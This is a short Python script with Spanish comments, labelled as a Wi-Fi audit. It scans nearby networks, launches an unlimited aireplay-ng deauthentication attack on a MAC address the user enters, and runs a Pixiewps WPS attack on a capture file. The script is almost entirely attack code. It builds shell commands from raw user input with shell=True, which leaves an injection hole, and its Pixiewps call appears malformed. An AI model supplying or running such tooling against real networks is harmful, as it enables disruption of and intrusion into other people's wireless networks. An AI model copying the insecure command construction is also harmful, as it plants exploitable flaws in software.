import subprocess
import time
import sys

def run_command(command):
    """Ejecuta un comando de shell y muestra la salida"""
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    
    if process.returncode == 0:
        return stdout.decode()
    else:
        return stderr.decode()

def scan_wifi():
    """Escanear redes Wi-Fi cercanas"""
    print("Escaneando redes Wi-Fi...")
    output = run_command("iw dev wlan0 scan | grep SSID")
    print(output)

def deauth_attack(target_mac, iface="wlan0"):
    """Realizar un ataque de desautenticación"""
    print(f"Realizando ataque de desautenticación contra {target_mac}...")
    output = run_command(f"sudo aireplay-ng --deauth 0 -a {target_mac} {iface}")
    print(output)

def pixiewps_attack(target_pcap):
    """Realizar un ataque Pixiewps sobre un archivo pcap"""
    print(f"Realizando ataque Pixiewps sobre {target_pcap}...")
    output = run_command(f"pixiewps -r {target_pcap} -o cracked.txt")
    print(output)

def main():
    print("Iniciando auditoría Wi-Fi...\n")
    
    # Escanear redes Wi-Fi
    scan_wifi()

    # Introduce la MAC del objetivo para el ataque de desautenticación
    target_mac = input("Introduce la MAC del objetivo para desautenticación (por ejemplo, 00:11:22:33:44:55): ")
    deauth_attack(target_mac)

    # Realizar ataque Pixiewps
    target_pcap = input("Introduce el archivo pcap para Pixiewps (por ejemplo, captura.pcap): ")
    pixiewps_attack(target_pcap)

if __name__ == "__main__":
    main()








